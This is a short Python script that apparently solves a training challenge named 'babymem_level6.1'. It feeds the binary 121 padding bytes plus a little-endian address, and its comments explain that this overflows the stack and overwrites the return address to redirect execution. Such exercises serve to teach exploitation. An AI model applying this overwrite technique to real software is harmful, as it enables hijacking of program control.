import subprocess as sp

def submit_input( process, in_val ):
    print( in_val )
    process.stdin.write( in_val )
    process.stdin.flush()

if __name__ == '__main__':
    app = ['/challenge/babymem_level6.1']

    # Communicate with the subprocess
    proc = sp.Popen(app, shell=False, bufsize=0,
                    stdin = sp.PIPE,
                    stderr = sp.PIPE)

    # This converts a hex number to a little-endian byte string
    n = 0x401662
    n = n.to_bytes( ( n.bit_length() + 7 ) // 8, 'little' ) or b'\0'

    # This overflows the stack, then overwrites the return address with the address
    # of the specific assembly instruction I want to jump to
    submit_input( proc, b'128' )
    submit_input( proc, b'a' * 121 + n )